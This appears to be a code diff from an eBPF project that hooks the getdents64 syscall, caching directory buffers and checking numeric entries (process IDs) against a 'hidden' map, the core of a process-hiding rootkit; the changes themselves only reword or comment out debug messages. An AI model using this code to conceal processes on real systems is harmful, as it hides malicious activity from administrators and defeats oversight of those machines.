@@ -73,7 +73,7 @@ static long __process_dirent_entry(__u32 index, void *data)
         return 0; // Skip unreadable name - move to next.
     }
 
-    PRINT_DEBUG("CURRENT D_NAME Threated : %s", d_name);
+    // PRINT_DEBUG("CURRENT D_NAME Threated : %s", d_name);
 
     __u8 *hidden = NULL;
     if (ft_isnumeric(d_name, PID_STR_MAX)) {
@@ -121,7 +121,7 @@ int tp_sys_enter_getdents64(struct sys_getdents64_enter_ctx *ctx)
     __u64 key  = bpf_get_current_pid_tgid(); //64 bits value returned.
 
     bpf_map_update_elem(&getdents_cache, &key, &dirp, BPF_ANY);
-    PRINT_DEBUG("Event ! Saving __user address in getdents_cache for dirp : 0x%llx & key : %lld", (unsigned long long)dirp, (unsigned long long)key);
+    PRINT_DEBUG("Event ! Saving __user dirent64 addr in cache for dirp : 0x%llx & key : %lld", (unsigned long long)dirp, (unsigned long long)key);
 
     return 0;
 }
@@ -148,7 +148,7 @@ int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx)
     if(!cache_val)
         return ret;
     
-    PRINT_DEBUG("Cached value found ! Signal received in syscall exit. Infos => dirp : 0x%llx & key : %lld", (unsigned long long)(*cache_val), (unsigned long long)key);
+    PRINT_DEBUG("Cache triggered ! tp/syscalls/sys_exit_getdents64. Infos => dirp : 0x%llx & key : %lld", (unsigned long long)(*cache_val), (unsigned long long)key);
 
     struct linux_dirent64 *dirp = (struct linux_dirent64*)(*cache_val);
 
